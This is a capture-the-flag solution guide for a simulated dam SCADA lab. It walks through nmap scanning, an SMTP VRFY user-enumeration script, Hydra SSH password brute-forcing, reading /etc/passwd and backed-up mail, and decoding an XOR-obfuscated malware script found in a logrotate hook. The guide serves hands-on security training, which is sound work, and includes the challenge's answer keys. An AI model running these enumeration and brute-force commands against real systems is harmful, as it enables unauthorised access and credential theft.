# Aqua Block Crisis Detected

*Solution Guide*

## Overview

*Aqua Block Crisis Detected* requires the competitor to enumerate usernames on a network, discover weak credentials, explore emails, search the filesystem, and finally discover and make sense of the malware.

>**Reminder!** Reading this solution guide *before* attempting the challenge will lead to the false notion that this challenge is easy to solve.

## Question 1

*What is the password that was disclosed?*

1. On the Kali machine, browse to`http://10.1.1.15/scada` and verify you can see the HMI of the three dams.
2. On the Kali machine, run the following commands in four different tabs to enumerate the networks.

    ```
    sudo nmap 10.1.1.0/24 -oN 1-basic.scan
    sudo nmap -p- -sV 10.1.1.0/24 -oN 1-all-tcp.scan
    sudo nmap 10.2.2.0/24 -oN 2-basic.scan
    sudo nmap -p- -sV 10.2.2.0/24 -oN 2-all-tcp.scan
    ```

    The two `basic.scan` files complete quickly. You should discover `10.1.1.21` has an SMTP port open. 

3. Enumerate users on this SMTP port. Create a list of common first names as `usernames.txt` and create the following `looper.sh` script to loop through your usernames against the SMTP server.

    ```bash
    #!/bin/bash

    TARGET="10.1.1.21"

    while read -r username; do
        expect -c "
            set timeout 1
            spawn telnet $TARGET 25
            expect \"220\"
            send \"VRFY $username\r\"
            expect {
                \"2** 2.0.0\" {
                    puts \"$username might be VALID!\"
                }
                timeout {
                    puts \"$username does not appear to exist\"
                }
            }
            send \"QUIT\r\"
            expect eof
        "
    done < usernames.txt
    ```

    You should have received at least one valid username provided your list had at least one of the names below. These are common "Alice and Bob" fictional characters known in the computer industry:

    ```
    alice
    bob
    charlie
    dan
    erin
    frank
    grace
    heidi
    ivan
    judy
    mallory
    niaj
    ```

4. Now that we have at least one known user (let's use `alice`) we see in the NMAP results TCP port 22 is open on `10.1.1.21`. We know a username and we know a pattern of the password; let's create a list of possible passwords (`alice00` - `alice99`). Run the following command to create a list of 100 "alice" passwords.

    ```bash
    for i in $(seq -w 00 99); do echo alice${i} >> alice-passwords.txt; done
    ```

5. Attempt to log into `alice` with the following Hydra command.

    ```bash
    hydra -s 22 -V -l alice -P /home/user/alice-passwords.txt 10.1.1.21 ssh
    ```

6. We have Alice's password! Login to `10.1.1.21` with Alice's password via ssh.

    ```bash
    ssh alice@10.1.1.21
    ```

7. You can discover the other users by running the following command on the dam's mail server.

    ```bash
    cat /etc/passwd
    ```

    We now see all usernames: Alice, Bob, Charlie, etc.

    In a different tab, attempt to crack all user login information by running the commands below and changing the usernames.
    
    ```bash
    for i in $(seq -w 00 99); do echo alice${i} >> alice-passwords.txt; done
    hydra -s 22 -V -l alice -P /home/user/alice-passwords.txt 10.1.1.21 ssh
    ```

8. When you have cracked all the credentials, navigate to your first tab and run the command below to switch user into any user (e.g., Bob).

    ```bash
    su bob
    ```

9. Because this is a mail server, run the mail command to view the user's inbox.

    ```bash
    mail
    ```

10. Run the command below to see a hidden file in each user's home directory that archives sent messages.

    ```bash
    ls -lha ~/
    ```

11. Run the command below to view the sent messages.

    ```bash
    cat ~/.sent_archive
    ```

12. It doesn't look like any leaked credentials are in these messages. Notice the message **X-UIDs** go from 10 to 100 and one of them is missing (76). Knowing this is not crucial, but it is helpful.

13. As noted in the challenge instructions, employees (i.e., *users*) attempted to remove their history, logs, and communications. A user may have deleted their sent messages. Navigate to the `/var/log` to see if any logs are present.

    ```bash
    cd /var/log
    ```

    No **mail.log** files; however, there is a**backup.tar.gz** file! It is only accessible by the `adm` group. Do any of the users you have credentials for have `adm` permissions? 

14. Run the command below to check.

    ```bash
    cat /etc/group | grep adm
    ```

15. Here we see Judy and Mallory are in the `adm` group. Switch user (`su`) into one of them.

    ```bash
    su mallory
    ```

16. Run the command below to copy the **backup.tar.gz** file to your home directory.

    ```bash
    cp /var/log/backup.tar.gz ~/
    ```

17. Extract the **backup.tar.gz** file.

    ```bash
    cd ~
    tar xf backup.tar.gz
    ls
    cd home
    ls
    ls -lhaR
    ```

    We see we have a backup of each user's **sent_archive**. 

18. Search through all of these messages now.

    ```bash
    cat ~/home/*/.sent_archive | less
    ```

    You should see the message below.
    
    ```
    From mallory@dam.local Sun Oct 22 13:00:00 2023
    Return-Path: <mallory@dam.local>
    X-Original-To: judy@dam.site
    Delivered-To: judy@dam.site
    Received: by mail-server (Postfix, from userid 1011)
        id Y16STU5B18; Sun, 22 Oct 2023 13:00:00 -0700 (PDT)
    Subject: Voicemail Received
    To: <judy@dam.site>
    User-Agent: mail (GNU Mailutils 3.14)
    Date: Sun, 22 Oct 2023 13:00:00 -0700
    Message-Id: <20231022130000.Y16STU5B18@mail-server>
    From: mallory <mallory@dam.local>
    X-IMAPbase:           1697823532                   76
    X-UID: 76
    Status: O

    Judy,

    Got your voicemail. The phrase for 'remote' is efad116ded80598a. Hope all turns out well. 

    Mallory
    ```

Mallory received a voicemail from Judy. However, Mallory sent the email to a different and internet-reachable domain! Was she a victim of social engineering or did she do this deliberately? We don't know. We do know we must find the malware. You now know the password disclosed by Mallory is `efad116ded80598a`. Yours will be different.

## Question 2

*What is the username/handle of the creator of the malware planted on the SCADA system?*

1. In your previous NMAP scans, you would have discovered SSH was running on TCP port `15851` at `10.2.2.25`. SSH into that machine.

    ```bash
    ssh -p 15851 remote@10.2.2.25
    ```

2. Explore the filesystem for malicious activity. One common place where malware can be referenced is **cron job**. Run the commands below to check cron jobs (remote user and root). *Reminder: being told where to explore in this solution guide diminishes the difficulty of solving this challenge.*

    ```bash
    crontab -l
    sudo crontab -l
    ```

    We see `*/5 * * * * /usr/sbin/logrotate /etc/logrotate.conf` and above it we see `### Run logrotate every 5 hours`; however, that syntax actually runs every five minutes! This indicates we should check further.

3. Read through the `/etc/logrotate.conf` file.

    ```bash
    cat /etc/logrotate.conf
    ```

4. At first glance, nothing stands out. However, the configuration details from `/etc/logrotate.d` are included. Explore those files using the command below.

    ```bash
    cd /etc/logrotate.d
    ls
    cat [any of the files]
    ```

5. When you open the `rsyslog` file, we see the kern.log is set to rotate at only 10K. That is very small! Also, we see after the kern.log is rotated, the `/usr/sbin/anacron` binary is executed. Let's explore the `/usr/sbin/anacron` file.

    ```bash
    file /usr/sbin/anacron
    cat /usr/sbin/anacron
    ```

    `anacron` is a bash script and doesn't look legitimate. Review this malware--some XOR occurs. We see a `k` (`key`) of 37. We also see an input string.

    Reverse engineering this obfuscated malware tells us it is attempting to reach out to a `cmd.canonicalupdates.com` (not legitimate!). The final line has some commented-out code. 

    You could modify the code to something like below and decode the author's name. In this example, the author was `o$c@r39`. `o$c@r39` is the answer to Question 2. Yours will be different.

    ```bash
    #!/bin/bash

    encode_xor() {
        local str="$1"
        local key="$2"
        local encoded=""

        for (( i=0; i<${#str}; i++ )); do
            local current_char_decimal=$(printf '%d' "'${str:$i:1}")
            local xor_result=$(($current_char_decimal ^ $key))
            encoded="${encoded}$(printf '%02x' $xor_result)"
        done

        echo "$encoded"
    }

    decode_xor() {
        local encoded="$1"
        local key="$2"
        local decoded=""

        for (( i=0; i<${#encoded}; i+=2 )); do
            local byte=${encoded:$i:2}
            local char_decimal=$((0x$byte))
            local xor_result=$(($char_decimal ^ $key))
            decoded="${decoded}$(printf \\$(printf '%03o' $xor_result))"
        done

        echo "$decoded"
    }

    input_string=""
    key=37

    decoded_str=$(decode_xor "52574c5151404b05475c054a01466557161c" "$key")
    #eval $decoded_str
    echo $decoded_str
    ###52574c5151404b05475c054a01466557161c
    ```
